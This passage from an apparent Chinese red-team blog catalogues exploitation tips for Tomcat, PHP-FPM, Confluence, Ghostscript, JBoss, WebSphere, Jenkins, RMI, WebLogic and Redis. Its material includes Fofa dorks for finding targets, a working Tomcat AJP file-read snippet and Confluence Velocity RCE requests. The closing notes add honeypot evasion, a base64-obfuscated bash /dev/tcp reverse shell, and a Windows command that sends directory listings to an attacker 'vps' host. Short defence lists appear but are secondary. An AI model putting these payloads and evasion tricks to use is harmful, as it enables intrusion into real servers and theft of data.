利用技巧</strong></p><p>1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了</p><p>主要代码也就这</p><pre><code class="hljs stylus">t = Tomcat(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">8009</span>)_, data = t.perform_request(<span class="hljs-string">&#x27;/&#x27;</span>, attributes=[    &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;req_attribute&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>: [<span class="hljs-string">&#x27;javax.servlet.include.request_uri&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]&#125;,     &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;req_attribute&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>: [<span class="hljs-string">&#x27;javax.servlet.include.path_info&#x27;</span>, <span class="hljs-string">&quot;/WEB-INF/web.xml&quot;</span>]&#125;,     &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;req_attribute&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>: [<span class="hljs-string">&#x27;javax.servlet.include.servlet_path&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]&#125;, ])<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;----------------------------&#x27;</span>)</span></span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>.join([bytes.decode(d.data)</span></span> <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data]))</code></pre><p>2.通过修改这里的路径可以进行Webapp切换, 默认是<code>ROOT/</code>, 需要切换应用就改成 <code>/admin/</code> 之类的</p><p>3.通常检测的时候, 尽量保持<code>t.perform_request(&#39;/&#39;</code> , 有的poc喜欢用 <code>/addsd</code> 这种的不存在的路径, 有些情况会读不到文件</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><p>2.屏蔽8009端口对外开放</p><h2 id="PHP-FPM-远程代码执行漏洞"><a href="#PHP-FPM-远程代码执行漏洞" class="headerlink" title="PHP-FPM 远程代码执行漏洞"></a>PHP-FPM 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞</p><p>2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行</p><p><strong>2. 影响组件</strong></p><p>Nginx + FPM + PHP7</p><p><strong>3. 漏洞指纹</strong></p><p><code>Nginx</code></p><p><code>PHP</code></p><p><code>nextcloud</code></p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析<br><a href="https://paper.seebug.org/1063/">https://paper.seebug.org/1063/</a></p><p><strong>6. 漏洞利用</strong></p><p>neex/phuip-fpizdam: Exploit for CVE-2019-11043<br><a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p><p>jas502n/CVE-2019-11043: php-fpm+Nginx RCE<br><a href="https://github.com/jas502n/CVE-2019-11043">https://github.com/jas502n/CVE-2019-11043</a></p><p><strong>7. 利用技巧</strong></p><p>1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502</p><p>k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br><a href="https://github.com/k8gege/CVE-2019-11043">https://github.com/k8gege/CVE-2019-11043</a></p><p>2.Nextcloud 这个应用的默认配置就存在漏洞</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版php</p><p>2.修改nginx配置</p><h2 id="CVE-2019-3396-Confluence-Wiki-远程代码执行"><a href="#CVE-2019-3396-Confluence-Wiki-远程代码执行" class="headerlink" title="CVE-2019-3396 Confluence Wiki 远程代码执行"></a>CVE-2019-3396 Confluence Wiki 远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Confluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行</p><p><strong>2. 影响组件</strong></p><p>Confluence</p><p><strong>3. 漏洞指纹</strong></p><p>Confluence</p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Confluence&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析<br><a href="https://paper.seebug.org/884/">https://paper.seebug.org/884/</a></p><p>Atlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心</p><blockquote><p><a href="https://blog.riskivy.com/atlassian-confluence-rce-cve-2019-3396/">Atlassian Confluence 远程代码执行漏洞分析</a></p></blockquote><p><strong>6. 漏洞利用</strong></p><p>jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞<br><a href="https://github.com/jas502n/CVE-2019-3396">https://github.com/jas502n/CVE-2019-3396</a></p><p><strong>7. 利用技巧</strong></p><p>1.本地写日志的方式getshell</p><p>这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了</p><p>这里的远程模板加载不支持http协议, 主要是<code>classloader</code>的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell</p><p>这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持<code>file协议</code>可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符</p><p><code>velocity</code>比<code>php</code>语法要相对严格一点, 可能会报错, 而且<code>velocity</code>渲染的时候, 目标文件不能太大, 但是极端情况可以试一下</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /synchrony/heartbeat HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">8091</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Ubuntu; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">66</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">66</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><span class="hljs-attribute">Accept</span>-Language: en-US, en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">8091</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">x</span>-forwarded-for: $i<span class="hljs-number">18</span>n.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;, null).invoke(null, null).exec(&#x27;gnome-calculator&#x27;).waitFor()</code></pre><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rest/tinymce/1/macro/preview</span> HTTP/1.1<span class="hljs-attribute">Host</span>: localhost:8090<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0<span class="hljs-attribute">Accept</span>: text/html, */*; q=0.01<span class="hljs-attribute">Accept-Language</span>: en-US, en;q=0.5<span class="hljs-attribute">Referer</span>: http://localhost:8090/<span class="hljs-attribute">Content-Type</span>: application/json; <span class="hljs-attribute">X-Requested-With</span>: XMLHttpRequest<span class="hljs-attribute">Content-Length</span>: 258<span class="hljs-attribute">Connection</span>: close&#123;&quot;contentId&quot;:&quot;65594&quot;, &quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;, &quot;body&quot;:&quot;&quot;, &quot;params&quot;:&#123;&quot;url&quot;:&quot;http://www.dailymotion.com/video/xcpa64?_template=/etc/passwd&quot;, &quot;width&quot;:&quot;300&quot;, &quot;height&quot;:&quot;200&quot;, &quot;_template&quot;:&quot;file:/var/atlassian/application-data/confluence/logs/atlassian-synchrony.log&quot;&#125;&#125;&#125;</code></pre><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><h2 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招</p><p><strong>2. 影响组件</strong></p><p>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p><p><strong>3. 漏洞指纹</strong></p><p><code>.ps/.jpg/.png</code></p><p><strong>4. Fofa Dork</strong></p><p><strong>5. 漏洞分析</strong></p><p>ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/157513">https://www.anquanke.com/post/id/157513</a></p><p><strong>6. 漏洞利用</strong></p><p>Exploit Database Search<br><a href="https://www.exploit-db.com/search?q=Ghostscript">https://www.exploit-db.com/search?q=Ghostscript</a></p><p>vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub<br><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p><p><strong>7. 利用技巧</strong></p><p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行</p><p>dnslog 可以用 <code>ping </code>uname<code>.admin.ceye.io</code> 或 <code>ping </code>whoami<code>.admin.ceye.io</code></p><p>保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造</p><p><code>ping </code>whoami<code>.centos.admin.ceye.io</code> / <code>ping </code>whoami<code>.ubuntu.admin.ceye.io</code></p><p>分别命名为 <code>centos_ps.jpg</code>/<code>ubuntu_ps.jpg</code>, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p><p><strong>8. 防护方法</strong></p><p>1.升级到最新版</p><h2 id="Jboss-相关漏洞"><a href="#Jboss-相关漏洞" class="headerlink" title="Jboss 相关漏洞"></a>Jboss 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>JBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响</p><p><strong>2. 影响组件</strong></p><p>Jboss</p><p><strong>3. 漏洞指纹</strong></p><p><code>Jboss</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;JBoss&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/186948.html">https://www.freebuf.com/vuls/186948.html</a></p><p><strong>6. 漏洞利用</strong></p><p>joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p><p>Perun/vuln/jboss at master · WyAtu/Perun<br><a href="https://github.com/WyAtu/Perun/tree/master/vuln/jboss">https://github.com/WyAtu/Perun/tree/master/vuln/jboss</a></p><p><strong>7. 利用技巧</strong></p><p>1.Jboss的漏洞在内网还是相对比较常见的, 试过几次<code>jexboss</code>, 效果还ok</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="Websphere-反序列化远程代码执行"><a href="#Websphere-反序列化远程代码执行" class="headerlink" title="Websphere 反序列化远程代码执行"></a>Websphere 反序列化远程代码执行</h2><p><strong>1. 漏洞简介</strong></p><p>Websphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(),</p><p>近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362)</p><p><strong>2. 影响组件</strong></p><p>WebSphere</p><p><strong>3. 漏洞指纹</strong></p><p><code>WebSphere</code></p><p><code>8880</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;IBM-WebSphere&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.<br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere</a></p><p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394">https://xz.aliyun.com/t/6394</a></p><p><strong>6. 漏洞利用</strong></p><p>java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits<br><a href="https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py">https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py</a></p><p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394">https://xz.aliyun.com/t/6394</a></p><p><strong>7. 利用技巧</strong></p><p>1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的</p><p>Tomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区<br><a href="https://xz.aliyun.com/t/309">https://xz.aliyun.com/t/309</a></p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="Jenkins-系列漏洞"><a href="#Jenkins-系列漏洞" class="headerlink" title="Jenkins 系列漏洞"></a>Jenkins 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Jenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令</p><p><strong>2. 影响组件</strong></p><p>Jenkins</p><p><strong>3. 漏洞指纹</strong></p><p><code>Jenkins</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Jenkins&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Jenkins RCE漏洞分析汇总<br><a href="http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&utm_medium=referral#%EF%BF%A6%EF%BE%80%EF%BE%BB%EF%BF%A7%EF%BE%BB%EF%BE%93">http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ</a></p><p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><p><strong>6. 漏洞利用</strong></p><p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><p>blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破<br><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a></p><p>gquere/pwn_jenkins: Notes about attacking Jenkins servers</p><p><a href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a></p><p><strong>7. 利用技巧</strong></p><p>1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大</p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><p>4.升级到最新版</p><h2 id="RMI-对外开放"><a href="#RMI-对外开放" class="headerlink" title="RMI 对外开放"></a>RMI 对外开放</h2><p><strong>1. 漏洞简介</strong></p><p>Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集</p><p>通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行.</p><p><strong>2. 影响组件</strong></p><p>java*</p><p><strong>3. 漏洞指纹</strong></p><p><code>1098, 1099, 1090, 8901, 8902, 8903</code></p><p><code>N\x00</code></p><p><code>rmiregistry</code></p><p><strong>4. Fofa Dork</strong></p><p><code>protocol==&quot;java-rmi&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>RMI-反序列化 – 先知社区<br><a href="https://xz.aliyun.com/t/6660">https://xz.aliyun.com/t/6660</a></p><p><strong>6. 漏洞利用</strong></p><p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><p>Java RMI服务远程命令执行利用_91Ri.org<br><a href="http://www.91ri.org/15276.html">http://www.91ri.org/15276.html</a></p><p><strong>7. 利用技巧</strong></p><p>1.rmi一般在内网开放的比较多, nmap 扫描如下</p><p><code>nmap -v 8.8.8.8 -p1099 -sV --script=rmi*</code></p><p><strong>8. 防护方法</strong></p><p>1.设置强口令</p><p>2.尽量不要开放到公网</p><p>3.限制来源IP</p><h2 id="Weblogic-T3-协议漏洞"><a href="#Weblogic-T3-协议漏洞" class="headerlink" title="Weblogic T3 协议漏洞"></a>Weblogic T3 协议漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.</p><p><strong>2. 影响组件</strong></p><p>Weblogic</p><p><strong>3. 漏洞指纹</strong></p><p>Lcom.tangosol.util.extractor.ReflectionExtractor</p><p>…</p><p><strong>4. Fofa Dork</strong></p><p><code>protocol==&quot;weblogic&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>相关漏洞有:</p><p>CVE-2017-3248<br><a href="https://paper.seebug.org/333/">https://paper.seebug.org/333/</a></p><p>CVE-2018-2628<br><a href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p>CVE-2018-2893<br><a href="https://www.freebuf.com/vuls/178105.html">https://www.freebuf.com/vuls/178105.html</a></p><p>CVE-2019-2890<br><a href="https://paper.seebug.org/1069/">https://paper.seebug.org/1069/</a></p><p>CVE-2020-2555(Oracle Coherence)<br><a href="https://paper.seebug.org/1141/">https://paper.seebug.org/1141/</a></p><p>除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.<br><a href="https://www.oracle.com/security-alerts/cpuapr2020.html">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p><p><strong>6. 漏洞利用</strong></p><p>weblogic 漏洞扫描工具<br><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p><p>CVE-2020-2555<br><a href="https://github.com/Y4er/CVE-2020-2555">https://github.com/Y4er/CVE-2020-2555</a></p><p><strong>7. 利用技巧</strong></p><p>1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap</p><p><code>nmap -sV --script=weblogic-t3-info.nse -p 7001</code></p><p>2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用</p><p>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.<br><a href="https://github.com/Bort-Millipede/WLT3Serial">https://github.com/Bort-Millipede/WLT3Serial</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p><h2 id="Weblogic-XMLDecoder反序列化"><a href="#Weblogic-XMLDecoder反序列化" class="headerlink" title="Weblogic XMLDecoder反序列化"></a>Weblogic XMLDecoder反序列化</h2><p><strong>1. 漏洞简介</strong></p><p>2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271.</p><p>2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令.</p><p><strong>2. 影响组件</strong></p><p>WebLogic 10.X</p><p>WebLogic 12.1.3</p><p><strong>3. 漏洞指纹</strong></p><p><code>/wls-wsat/CoordinatorPortType</code><br><code>/_async/AsyncResponseService</code><br><code>/_async/AsyncResponseServiceSoap12</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;WebLogic-Server&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>（CVE-2017-3506 &amp;CVE-2017-10271）<br><a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/</a></p><p>CVE-2019-2725<br><a href="https://paper.seebug.org/909/">https://paper.seebug.org/909/</a></p><p><strong>6. 漏洞利用</strong><br>weblogicScanner<br><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p><p><strong>7. 利用技巧</strong></p><p>1.由于nginx转发问题, 尝试这种路径, 可能有惊喜</p><p><code>/../wls-wsat/CoordinatorPortType11</code><br><code>/../_async/AsyncResponseService</code></p><p>2.Weblogic 写shell有个技巧</p><p>可以通过<code>find</code>/<code>grep</code>命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的<code>logo.png</code> / <code>/static/css/main.css</code></p><p><strong>8. 防护方法</strong></p><p>1.通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问；</p><p>2.删除对应war包并重启 webLogic；</p><p>3.限制源IP对应 weblogic 7001端口的访问.</p><h2 id="Weblogic-IIOP"><a href="#Weblogic-IIOP" class="headerlink" title="Weblogic IIOP"></a>Weblogic IIOP</h2><p><strong>1. 漏洞简介</strong></p><p>2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行.</p><p><strong>2. 影响组件</strong></p><p>Oracle WebLogic Server version:</p><p>10.3.6.0.0</p><p>12.1.3.0.0</p><p>12.2.1.3.0 and 12.2.1.4.0</p><p><strong>3. 漏洞指纹</strong></p><p><code>GIOP &amp;&amp; com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;WebLogic-Server&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>WebLogic CVE-2020-2551漏洞分析<br><a href="https://paper.seebug.org/1138/">https://paper.seebug.org/1138/</a></p><p><strong>6. 漏洞利用</strong></p><p>Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551<br><a href="https://github.com/Y4er/CVE-2020-2551">https://github.com/Y4er/CVE-2020-2551</a></p><p><strong>7. 利用技巧</strong></p><p>漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/201005">https://www.anquanke.com/post/id/201005</a></p><p><strong>8. 防护方法</strong></p><p>1.及时更新补丁</p><p>2.通过 Weblogic 控制台进行关闭 IIOP 协议</p><h2 id="Redis-相关漏洞"><a href="#Redis-相关漏洞" class="headerlink" title="Redis 相关漏洞"></a>Redis 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p><p>Redis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作</p><p><strong>2. 影响组件</strong></p><p>Redis</p><p><strong>3. 漏洞指纹</strong></p><p><code>6379</code></p><p><strong>4. Fofa Dork</strong></p><p><code>app=&quot;Redis&quot; &amp;&amp; &quot;redis_version&quot;</code></p><p><strong>5. 漏洞分析</strong></p><p>Redis 基于主从复制的 RCE 利用方式<br><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p><p><strong>6. 漏洞利用</strong></p><p>n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p><strong>7. 利用技巧</strong></p><p>1.当Redis 权限满足写文件时</p><p>linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell</p><p>2.当Redis 权限不满足写文件时</p><p>发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞</p><p>发现Redis记录中存在<code>AC ED</code>这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据</p><p><strong>8. 防护方法</strong></p><p>1.Redis 设置强口令</p><p>2.Redis 尽量不要开放到公网</p><p>3.限制来源IP</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>1.记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台</p><p>搜索结果 – FOFA网络空间测绘系统<br><a href="https://fofa.so/result?q=%22var+jtoken=%27%22&amp;qbase64=InZhciBqdG9rZW49JyI=">https://fofa.so/result?q=%22var+jtoken%3D%27%22&amp;qbase64=InZhciBqdG9rZW49JyI%3D</a></p><p>2.反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到</p><p>Reverse shell cheatsheet 多种反弹shell的命令<br><a href="https://krober.biz/misc/reverse_shell.php">https://krober.biz/misc/reverse_shell.php</a></p><p>3.很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参</p><p><code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1</code></p><p>base64 可以转换成</p><p><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx</code></p><p>最终可以变成</p><p><code>bash -c &quot;&#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</code></p><p>4.windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以</p><p><code>for /f %s in (&#39;dir c:\ /b&#39;) do explorer http://vps:8000/?%s</code></p><p><code>\\vps\share\shell.bat</code></p><p>5.针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况</p><p>这里主要是没有指定<code>hostname</code>, 这里可以使用<code>socat</code>进行流量转发, 无需修改POC, 以<code>CVE-2019-12409</code>为例</p><blockquote><p>这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现<br>这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址<br>通过查看报错, 可以得知内网地址, 例如 172.18.0.2<br>使用如下两条命令即可执行, 替换 <code>[报错中的ip]</code>, <code>[远程目标的ip]</code></p></blockquote><pre><code class="hljs armasm"><span class="hljs-symbol">ip</span> <span class="hljs-keyword">addr</span> <span class="hljs-keyword">add</span> [报错中的<span class="hljs-built_in">ip</span>]/<span class="hljs-number">24</span> dev lo<span class="hljs-symbol">socat</span> tcp4-listen:<span class="hljs-number">18983</span>, bind=[报错中的<span class="hljs-built_in">ip</span>], reuseaddr, fork tcp4-connect:[远程目标的<span class="hljs-built_in">ip</span>]:<span class="hljs-number">18983</span></code></pre><p>6.Java 反序列化是这两年的重中之重, 